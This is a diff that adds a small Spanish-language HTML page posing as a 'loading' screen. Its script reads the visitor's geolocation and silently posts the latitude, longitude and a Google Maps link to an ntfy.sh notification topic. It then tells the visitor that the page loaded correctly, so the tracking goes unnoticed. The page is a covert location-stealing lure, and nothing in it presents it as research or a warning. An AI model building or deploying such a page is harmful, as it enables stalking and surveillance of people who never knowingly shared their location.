@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Cargando...</title>
+</head>
+<body>
+  <p>Cargando página...</p>
+  <script>
+    navigator.geolocation.getCurrentPosition(function(pos) {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const maps = `https://maps.google.com/?q=${lat},${lon}`;
+      fetch("https://ntfy.sh/ubicacion-jared-2024xz", {
+        method: "POST",
+        body: `Ubicación recibida!\nLatitud: ${lat}\nLongitud: ${lon}\nMaps: ${maps}`
+      });
+      document.body.innerHTML = "<p>Página cargada correctamente.</p>";
+    }, function() {
+      document.body.innerHTML = "<p>Página cargada correctamente.</p>";
+    });
+  </script>
+</body>
+</html>
